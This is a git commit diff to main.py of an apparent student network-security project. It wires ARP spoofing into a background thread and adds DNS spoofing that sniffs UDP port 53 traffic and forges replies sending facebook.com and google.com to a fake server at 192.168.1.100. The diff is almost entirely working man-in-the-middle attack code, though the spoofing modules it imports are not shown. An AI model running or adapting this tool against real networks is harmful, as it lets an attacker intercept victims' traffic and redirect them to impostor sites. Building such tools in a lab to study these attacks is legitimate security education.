7f3820dfa88325139f9c0b91f071a320694322e8
JulienErblandEPFL <julien.erbland@epfl.ch>
2025-05-15 18:43:54 +0200

    dns added in the main

--- main.py
+++ main.py
@@ -1,5 +1,9 @@
 from setup.network_scan import scan_network
 from attacks.arp_spoof import start_spoofing
+from attacks.dns_spoof import spoof_dns
+from scapy.arch import get_if_hwaddr
+from scapy.sendrecv import sniff
+import threading
 import sys
 
 def choose_host(hosts, role = "victim"):
@@ -23,8 +27,27 @@ def main():
     victim_ip, victim_mac = choose_host(hosts, "victim")
     gateway_ip, gateway_mac = choose_host(hosts, "gateway")
 
-    print(f"\nLaunching ARP spoofing...")
-    start_spoofing(victim_ip, victim_mac, gateway_ip, gateway_mac)
+    #Allow the ARP spoofing to run in parallel
+    arp_thread = threading.Thread(
+        target=start_spoofing,
+        args=(victim_ip, victim_mac, gateway_ip, gateway_mac)
+    )
+    arp_thread.daemon = True #To run in the background
+    arp_thread.start()
+
+    # prepare DNS spoofing
+    spoofed_domains = ["facebook.com", "google.com"]   #example list
+    fake_ip = "192.168.1.100"                         #fake server IP
+    attacker_mac = get_if_hwaddr(iface)               #needed by spoof_dns
+
+    print(f"\nLaunching DNS spoofing on {iface} for {spoofed_domains} → {fake_ip}")
+    #sniff DNS queries and handle them with spoof_dns
+    sniff(
+        iface=iface,
+        filter="udp port 53",
+        prn=lambda pkt: spoof_dns(pkt, spoofed_domains, fake_ip, attacker_mac, iface),
+        store=False
+    )
 
 if __name__ == "__main__":
     main()
